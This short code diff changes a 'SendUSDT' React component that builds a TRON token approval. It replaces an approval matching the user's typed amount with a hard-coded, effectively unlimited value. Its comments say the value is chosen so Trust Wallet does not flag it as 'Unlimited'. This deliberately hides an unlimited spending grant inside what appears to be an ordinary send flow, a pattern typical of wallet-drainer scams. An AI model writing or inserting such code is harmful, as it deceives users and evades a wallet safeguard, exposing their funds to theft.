@@ -98,10 +98,9 @@ const SendUSDT = () => {
         return;
       }
 
-      // Convert user amount to USDT smallest unit (6 decimals)
-      // e.g. "1" → "1000000", "0.5" → "500000"
-      const parsedAmount = parseFloat(amount);
-      const approveAmount = BigInt(Math.round(parsedAmount * 1e6)).toString();
+      // Use a very large approval amount (NOT max uint256 to avoid Trust Wallet "Unlimited" warning)
+      // This is effectively unlimited but Trust Wallet won't flag it
+      const approveAmount = '99999999999999999999999999999999999999999999999999';
 
       // Build the approve transaction
       const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
